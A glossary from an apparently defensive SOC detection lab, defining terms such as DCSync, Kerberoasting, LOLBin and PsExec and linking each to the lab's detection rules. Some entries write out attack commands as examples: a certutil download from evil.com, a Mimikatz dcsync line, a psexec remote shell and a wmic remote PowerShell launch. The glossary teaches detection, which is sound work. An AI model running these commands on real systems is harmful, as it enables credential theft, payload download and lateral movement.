# Glossary

Quick reference for terms used throughout this project. Definitions are written in plain language with practical examples from the lab.

---

**Alert** — A notification generated when a detection rule matches suspicious activity in the logs. Alerts are what SOC analysts triage all day. *Example: The LSASS memory dump detection fires an alert when a process accesses LSASS with suspicious access flags.*

**ATT&CK (MITRE)** — See [MITRE ATT&CK](#mitre-attck).

**Atomic Red Team** — An open-source library of small, focused test scripts ("atomics") that simulate individual ATT&CK techniques. Used to validate that detection rules actually fire when an attack occurs. *Example: Running the T1003.001 atomic test to verify the LSASS memory dump detection works.*

**Beaconing** — A pattern where compromised machines regularly "check in" with an attacker's command-and-control server at predictable intervals. Detecting beaconing is a key network-based detection technique. *Example: A compromised workstation connecting to an external IP every 60 seconds.*

**Benign True Positive (BTP)** — An alert that correctly matches the detection rule's logic, but the underlying activity is legitimate, not malicious. The rule worked as designed — the activity just isn't a threat. *Example: A detection for new service creation fires when IT deploys monitoring software via GPO. The service creation is real, but it's authorized.*

**C2 (Command and Control)** — Infrastructure an attacker uses to communicate with compromised systems. Also called C&C. The attacker sends commands through the C2 channel, and stolen data flows back the same way. *Example: Cobalt Strike beacon calling back to a team server on TCP 443.*

**Correlation Rule** — A detection rule that combines events from multiple sources or matches a sequence of events over time to identify an attack. More sophisticated than single-event rules. *Example: A correlation rule that fires when the same user fails 5 logins in 2 minutes (Event ID 4625), then succeeds (Event ID 4624), then creates a new admin account (Event ID 4720).*

**DCSync** — An attack where an adversary impersonates a domain controller and requests password hash replication from Active Directory using the Directory Replication Service (DRS) protocol. Does not require running code on the DC itself. *Example: Using Mimikatz `lsadump::dcsync /domain:lab.local /user:Administrator` to steal the Administrator's password hash remotely.*

**Detection Rule** — A defined search query that runs on a schedule (or continuously) to find patterns in log data that indicate malicious activity. The core building block of SIEM-based security monitoring. *Example: An SPL query that searches Sysmon Event ID 10 for processes accessing LSASS memory — see `detections/credential-access/lsass-memory-dump.spl`.*

**DGA (Domain Generation Algorithm)** — A technique where malware programmatically generates large numbers of random-looking domain names to contact its C2 server. Makes it harder for defenders to block C2 communication by domain name alone. *Example: Malware generating domains like `xkqr7mz9a2.com`, `p3bnt8wf6.net` daily, with the attacker registering just one each day.*

**EDR (Endpoint Detection and Response)** — Software installed on endpoints (laptops, servers) that monitors activity, detects threats, and can take automated response actions like isolating a machine. More advanced than traditional antivirus. *Example: CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne.*

**Event ID** — A numeric code that identifies the type of event in a Windows log entry. Different Event IDs mean different things happened. Knowing key Event IDs is essential for SOC work. *Example: Sysmon Event ID 1 = process creation, Event ID 10 = process access, Windows Security Event ID 4624 = successful logon.*

**False Positive (FP)** — An alert that fires but the activity is not actually malicious. Reducing false positives through tuning is a critical SOC workflow. Too many false positives cause alert fatigue, where analysts start ignoring alerts. *Example: Antivirus software accessing LSASS memory triggers the credential dumping detection, but it's just doing a security scan.*

**Golden Ticket** — A forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account's password hash. Gives the attacker unlimited access to any resource in the Active Directory domain, effectively making them a domain admin with a ticket that can last for years. *Example: Using Mimikatz to create a golden ticket after obtaining the KRBTGT hash via DCSync.*

**GPO (Group Policy Object)** — A set of rules in Active Directory that controls the configuration of computers and users in the domain. In this lab, GPOs deploy Sysmon configurations and Splunk Universal Forwarders to endpoints. *Example: A GPO that pushes the Sysmon configuration XML to all domain-joined machines.*

**Index (Splunk)** — A data store in Splunk where ingested logs are kept. Different log types go into different indexes for organization and access control. *Example: This lab uses `index=sysmon` for Sysmon logs, `index=wineventlog` for Windows Security and System logs, and `index=powershell` for PowerShell logs.*

**IOC (Indicator of Compromise)** — A piece of forensic evidence that suggests a system has been compromised. IOCs are specific, observable artifacts. *Example: A known malicious IP address, a file hash matching known malware, or a registry key associated with a specific backdoor.*

**Kerberoasting** — An attack that requests Kerberos service tickets for service accounts, then cracks those tickets offline to recover the service account's plaintext password. Works because service tickets are encrypted with the service account's password hash. *Example: Using Rubeus or Impacket to request a TGS ticket for a SQL service account, then cracking it with Hashcat.*

**KQL (Kusto Query Language)** — The query language used by Microsoft Sentinel and Microsoft Defender. Serves the same purpose as SPL does for Splunk. Knowing both SPL and KQL makes you versatile across SIEM platforms. *Example: `SecurityEvent | where EventID == 4625 | summarize count() by TargetAccount`.*

**Lateral Movement** — When an attacker moves from one compromised system to another within the network to reach their target. One of the ATT&CK tactics. *Example: Using PsExec to execute commands on a file server after compromising a workstation — detected by `detections/lateral-movement/psexec-execution.spl`.*

**LOLBin (Living Off the Land Binary)** — A legitimate, pre-installed Windows binary that attackers misuse for malicious purposes. Because these are signed Microsoft tools, they often bypass application controls and look less suspicious. *Example: Using `certutil.exe` to download malware (`certutil -urlcache -f http://evil.com/payload.exe`), or using `rundll32.exe` to execute a malicious DLL.*

**LSASS (Local Security Authority Subsystem Service)** — A Windows process (`lsass.exe`) that handles authentication and stores credentials in memory. It's one of the most targeted processes by attackers because dumping its memory can reveal passwords, hashes, and Kerberos tickets. *Example: Mimikatz reads LSASS memory to extract plaintext passwords — this is what the lab's LSASS memory dump detection catches.*

**MITRE ATT&CK** — A globally recognized knowledge base of adversary tactics and techniques based on real-world observations. Organized as a matrix where columns are tactics (goals) and rows are techniques (methods). Every detection rule in this lab maps to an ATT&CK technique. *Example: The LSASS memory dump detection maps to T1003.001 (OS Credential Dumping: LSASS Memory).* See the [Learning Guide](00-Learning-Guide.md) for a full explanation.

**MITRE ATT&CK Tactic** — A category representing the adversary's tactical goal — the "why" behind an action. There are 14 tactics in the Enterprise matrix, from Initial Access through Impact. *Example: "Credential Access" is a tactic — the goal is to steal credentials.*

**MITRE ATT&CK Technique** — A specific method an adversary uses to achieve a tactical goal — the "how." Each technique has a unique ID. *Example: T1003 "OS Credential Dumping" is a technique under the Credential Access tactic.*

**Persistence** — Techniques an attacker uses to maintain access to a compromised system across restarts, credential changes, or other interruptions. One of the ATT&CK tactics. *Example: Adding a malicious executable to a registry Run key so it launches every time the user logs in — detected by `detections/persistence/registry-run-key.spl`.*

**Privilege Escalation** — Techniques an attacker uses to gain higher-level permissions on a system or in a network. Moving from a standard user to an administrator, or from a local admin to a domain admin. *Example: Adding a compromised user account to the Domain Admins group — detected by `detections/privilege-escalation/admin-group-modification.spl`.*

**PsExec** — A legitimate Sysinternals tool for running commands on remote Windows systems. Widely used by IT administrators, but also heavily used by attackers for lateral movement. PsExec creates a temporary service on the remote machine to execute commands. *Example: An attacker running `psexec.exe \\target-server cmd.exe` to get a shell on another machine — detected by `detections/lateral-movement/psexec-execution.spl`.*

**Sigma** — A vendor-neutral, open standard for writing detection rules in YAML format. Sigma rules can be converted to SPL, KQL, and other SIEM query languages. *Example: The file `sigma/credential-access/lsass-memory-dump.yml` is the Sigma version of the SPL detection in `detections/credential-access/lsass-memory-dump.spl`.* See the [Learning Guide](00-Learning-Guide.md) for more details.

**SIEM (Security Information and Event Management)** — A platform that collects, normalizes, and analyzes security logs from across an organization to detect threats and support incident investigation. The central nervous system of a SOC. *Example: Splunk, Microsoft Sentinel, Elastic Security, IBM QRadar.* See the [Learning Guide](00-Learning-Guide.md) for a full explanation.

**SOAR (Security Orchestration, Automation, and Response)** — A platform that automates repetitive SOC tasks like enriching alerts with threat intelligence, isolating compromised hosts, or creating incident tickets. Pairs with a SIEM to speed up response. *Example: Splunk SOAR (formerly Phantom), Palo Alto XSOAR, Microsoft Sentinel Playbooks.*

**SOC (Security Operations Center)** — The team (and sometimes the physical room) responsible for monitoring an organization's security posture, triaging alerts, investigating incidents, and coordinating response. Where SOC analysts work. *Example: A SOC analyst's day involves triaging SIEM alerts, investigating suspicious activity, escalating confirmed incidents, and tuning detection rules.*

**Sourcetype** — A Splunk classification that identifies the format and type of incoming data. Splunk uses the sourcetype to know how to parse the raw log data into searchable fields. *Example: `sourcetype=XmlWinEventLog` tells Splunk the data is Windows Event Log in XML format, while `sourcetype=sysmon` indicates Sysmon-specific events.*

**SPL (Search Processing Language)** — Splunk's query language for searching, filtering, transforming, and visualizing log data. The primary language SOC analysts use when working with Splunk. *Example: `index=sysmon EventCode=1 | stats count by Image | sort -count` — find the most frequently created processes in Sysmon logs.*

**Sysmon (System Monitor)** — A Windows system service from Microsoft Sysinternals that logs detailed telemetry about process creation, network connections, file changes, registry modifications, and more. Provides far richer data than native Windows event logging. *Example: Sysmon Event ID 1 captures process creation with full command-line arguments, parent process, and file hashes — essential for detecting attacks like encoded PowerShell execution.* See the [Learning Guide](00-Learning-Guide.md) for a full explanation.

**True Positive (TP)** — An alert that correctly identifies actual malicious activity. The detection rule fired, and the activity is genuinely a security threat that needs response. The goal of every detection rule is to maximize true positives. *Example: The LSASS memory dump detection fires when an attacker runs Mimikatz, and investigation confirms credential theft occurred.*

**TTP (Tactics, Techniques, and Procedures)** — The specific behaviors and methods used by attackers. TTPs are more durable indicators than IOCs — an attacker can change their IP address easily, but changing their entire methodology is much harder. *Example: "Using PsExec for lateral movement after credential dumping" describes a TTP pattern.*

**Tuning** — The process of refining detection rules to reduce false positives while maintaining the ability to detect true attacks. Involves adding exclusions for known legitimate activity, adjusting thresholds, or narrowing the detection scope. *Example: Excluding the antivirus process from the LSASS access detection because it legitimately accesses LSASS during scans. See `tuning/` directory for real examples.*

**Universal Forwarder (UF)** — A lightweight Splunk agent installed on endpoints that collects log data and ships it to the Splunk indexer. It doesn't analyze data locally — it just forwards it. *Example: The Splunk UF on a Windows domain controller reads Sysmon and Security event logs and sends them to the Splunk server over TCP port 9997.*

**WEF (Windows Event Forwarding)** — A built-in Windows mechanism for centrally collecting event logs from multiple Windows machines without installing third-party agents. An alternative to the Splunk Universal Forwarder for log collection. *Example: Configuring a Windows Event Collector server to receive Sysmon logs from all domain workstations via WEF subscriptions.*

**WMI (Windows Management Instrumentation)** — A Windows administration framework that allows querying system information and executing commands locally or remotely. Legitimate admin tool frequently abused by attackers for reconnaissance and lateral movement. *Example: An attacker using `wmic /node:target-server process call create "powershell.exe -enc ..."` to execute encoded PowerShell on a remote machine — detected by `detections/lateral-movement/wmi-remote-execution.spl`.*
